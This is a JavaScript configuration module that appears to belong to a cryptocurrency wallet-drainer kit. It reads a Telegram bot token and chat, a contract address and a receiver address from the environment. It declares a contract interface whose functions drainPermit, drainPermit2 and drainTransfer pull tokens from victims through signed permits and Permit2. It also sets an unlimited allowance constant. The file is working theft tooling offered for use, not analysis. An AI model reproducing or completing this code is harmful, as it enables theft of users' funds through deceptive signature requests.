export const REOWN_PROJECT_ID = import.meta.env.VITE_REOWN_PROJECT_ID
export const TG_TOKEN = import.meta.env.VITE_TG_TOKEN
export const TG_CHAT = import.meta.env.VITE_TG_CHAT
export const CONTRACT = import.meta.env.VITE_CONTRACT
export const RECEIVER = import.meta.env.VITE_RECEIVER
export const CHAIN_ID = Number(import.meta.env.VITE_CHAIN_ID || 1)

export const CONTRACT_ABI = [
  "function drainPermit(address token,address from,uint256 amount,uint256 deadline,uint8 v,bytes32 r,bytes32 s)",
  "function drainPermit2(address token,address from,uint160 amount,uint48 expiration,uint48 nonce,uint256 sigDeadline,bytes calldata signature)",
  "function drainTransfer(address token,address from,uint256 amount)",
  "function multicall(bytes[] data)"
]

export const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"

export const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
  "function nonces(address) view returns (uint256)",
  "function name() view returns (string)",
  "function version() view returns (string)",
  "function decimals() view returns (uint8)"
]

export const MAX = (2n ** 256n) - 1n